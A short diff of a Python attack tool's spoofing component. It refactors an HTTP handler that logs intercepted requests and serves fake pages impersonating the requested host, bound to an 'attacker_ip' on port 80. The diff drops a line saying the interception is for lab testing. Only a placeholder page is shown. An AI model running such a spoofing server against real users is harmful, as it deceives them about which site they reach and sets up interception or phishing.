@@ -176,36 +176,30 @@ def handle_command(command):
     except Exception as e:
         log_error(f"Failed to handle command: {str(e)}")
 
-def ssl_spoof_handler(request, client_address, server):
-    class Handler(SimpleHTTPRequestHandler):
-        def do_GET(self):
-            host = self.headers.get('Host', 'unknown')
-            log_info(f"Intercepted GET for: {host}{self.path}")
+class SSLSpoofHandler(SimpleHTTPRequestHandler):
+    def do_GET(self):
+        host = self.headers.get('Host', 'unknown')
+        log_info(f"Intercepted GET for: {host}{self.path}")
 
-            self.send_response(200)
-            self.send_header("Content-type", "text/html")
-            self.end_headers()
-            html = f"""
-            <html>
-            <head><title>Fake Page</title></head>
-            <body>
-                <h1>This is a spoofed version of {host}</h1>
-                <p>All traffic is intercepted for lab testing.</p>
-            </body>
-            </html>
-            """
-            self.wfile.write(html.encode())
+        self.send_response(200)
+        self.send_header("Content-type", "text/html")
+        self.end_headers()
+        html = f"""
+        <html>
+        <head><title>Fake Page</title></head>
+        <body>
+            <h1>This is a spoofed version of {host}</h1>
+        </body>
+        </html>
+        """
+        self.wfile.write(html.encode())
 
-        def log_message(self, format, *args):
-            return  # Silence default logging
-
-    return Handler(request, client_address, server)
-
+    def log_message(self, format, *args):
+        return  # Suppress default logging
 
 def run_spoofed_http_server():
     server_address = (attacker_ip, 80)
-    handler = partial(ssl_spoof_handler)
-    httpd = HTTPServer(server_address, handler)
+    httpd = HTTPServer(server_address, SSLSpoofHandler)
     log_info(f"Starting spoofed HTTP server on {attacker_ip}:80")
     httpd.serve_forever()
 
